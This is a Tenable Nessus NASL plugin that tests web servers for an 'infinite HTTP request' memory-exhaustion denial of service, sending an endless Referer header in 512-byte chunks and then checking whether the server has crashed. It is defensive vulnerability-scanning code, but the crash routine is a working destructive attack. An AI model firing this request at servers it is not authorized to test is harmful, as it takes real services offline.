#
# (C) Tenable Network Security, Inc.
#

# Script audit and contributions from Carmichael Security
#      Erik Anderson <eanders@carmichaelsecurity.com> (nb: domain no longer exists)
#      Added BugtraqID
#
# References:
# Date:  Thu, 8 Mar 2001 15:04:20 +0100
# From: "Peter_Gründl" <peter.grundl@DEFCOM.COM>
# Subject: def-2001-10: Websweeper Infinite HTTP Request DoS
# To: BUGTRAQ@SECURITYFOCUS.COM
#
# Affected:
# WebSweeper 4.0 for Windows NT
# 


include("compat.inc");

if(description)
{
 script_id(11084);
 script_version ("$Revision: 1.36 $");
 script_bugtraq_id(2465);
 script_xref(name:"OSVDB", value:"13882");

 script_name(english: "Web Server HTTP Header Memory Exhaustion DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is vulnerable to the 'infinite request' attack." );
 script_set_attribute(attribute:"description", value:
"It was possible to kill the web server by sending an invalid 'infinite'
HTTP request  that never ends, like:
GET / HTTP/1.0
Referer: XXXXXXXXXXXXXXXXXXXXXXXX ...


A cracker may exploit this vulnerability to make your web server crash
continually (if the attack saturates virtual memory on the target) or
even execute arbitrary code on your system (in case of buffer / heap 
overflow)." );
 script_set_attribute(attribute:"solution", value:
"Upgrade your software or protect it with a filtering reverse proxy." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C" );

script_end_attributes();

 script_summary(english: "Infinite HTTP request kills the web server");
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");
 script_family(english: "Web Servers");
 script_require_ports("Services/www", 80);
 script_dependencie("httpver.nasl", "http_version.nasl", "vnc_http.nasl");
# script_exclude_keys("www/vnc");
 exit(0);
}

########

# We can keep the old API. Using the new one is not interesting here
include("global_settings.inc");
include("http_func.inc");

port = get_http_port(default: 80);
if(! get_port_state(port)) exit(0);

if (get_kb_item('www/'+port+'/vnc')) exit(0);

banner = get_http_banner(port:port);
# WN waits for 30 s before sending back a 408 code
if (egrep(pattern:"Server: +WN/2\.4\.", string:banner)) exit(0);

if (http_is_dead(port: port)) exit(0);

soc = http_open_socket(port);
if(! soc) exit(0);

crap512 = crap(512);
r= http_get(item: '/', port:port);
r= r - '\r\n\r\n';
r= strcat(r, '\r\nReferer: ', crap512);

send(socket:soc, data: r);
cnt = 0;

while (send(socket: soc, data: crap512) > 0) { 
	cnt = cnt+512;
	if(cnt > 524288) {
		r = recv(socket: soc, length: 13, timeout: 2);
		http_close_socket(soc);
		if (r)
		{
			debug_print('r=', r);
			exit(0);
		}
		if (http_is_dead(port:port, retry:3))
		{
		  if (report_paranoia >= 1)
			security_hole(port, extra: strcat(
'\nThe web server was killed after receiving ', cnt, ' bytes\n',
'** This might be a false positive.'));
       	   	  exit(0);
		}
		else if ( report_paranoia > 1 )
                {
		security_hole(port: port, extra: '\nNessus was unable to crash the web server,\nso this might be a false positive.'); 
		}
                exit(0);
	}
}

debug_print(level: 2, 'port=', port, ', CNT=', cnt, '\n');
# Keep the socket open, in case the web server itself is saturated

if (report_paranoia >= 1 && http_is_dead(port: port, retry: 3))
 security_hole(port, extra: strcat(
'\nThe web server was killed after receiving ', cnt, ' bytes.\n',
'** This might be a false positive.'));

http_close_socket(soc);
